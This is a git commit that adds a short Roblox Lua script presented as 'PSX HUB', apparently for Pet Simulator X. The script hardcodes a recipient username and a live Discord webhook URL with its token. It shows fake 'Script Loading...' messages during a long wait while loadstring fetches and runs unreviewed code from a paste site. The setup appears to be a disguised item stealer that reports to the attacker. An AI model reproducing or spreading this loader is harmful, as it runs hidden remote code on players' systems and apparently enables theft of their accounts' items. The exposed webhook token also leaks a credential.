a2d68b05797c906d59f02db0987a0c83e0501ede
Rafacasarii <133924202+Rafacasarii@users.noreply.github.com>
2023-05-29 13:38:04 +0700

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,8 @@
+UserName = "SPELEMEN_5"
+Webhook = "https://discord.com/api/webhooks/1111174322724286484/Zyav5qJFbDX7MpmyeGN4eTcovmTQud0ySsdqvRfFTYHkiBNMGXMjFZv45TpQiP8wlfYN"
+_G.ScriptName = "PSX HUB"
+_G.FirstText = "Please wait.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 300
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
